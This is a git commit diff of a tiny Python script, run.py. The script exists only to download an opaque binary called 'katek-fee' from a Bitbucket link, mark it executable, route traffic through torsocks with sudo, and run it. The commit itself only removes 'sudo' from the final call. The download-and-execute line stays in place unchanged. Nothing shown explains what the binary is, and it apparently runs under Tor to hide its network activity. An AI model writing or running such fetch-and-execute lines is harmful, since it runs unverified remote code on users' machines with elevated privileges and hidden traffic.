66fe85a687e165330e40993eb3a4ed2b3b8c1116
Anli Angku <100510435+AnliAngku21@users.noreply.github.com>
2022-03-05 06:17:10 +0700

    Update run.py

--- run.py
+++ run.py
@@ -1,4 +1,4 @@
 import os
 import subprocess
 os.system('wget https://bitbucket.org/anli_angku/aset-anli/downloads/katek-fee && sudo chmod u+x katek-fee && ls && sudo torsocks on && sudo torsocks')
-subprocess.call(['sudo ./katek-fee --help'])
+subprocess.call(['./katek-fee --help'])
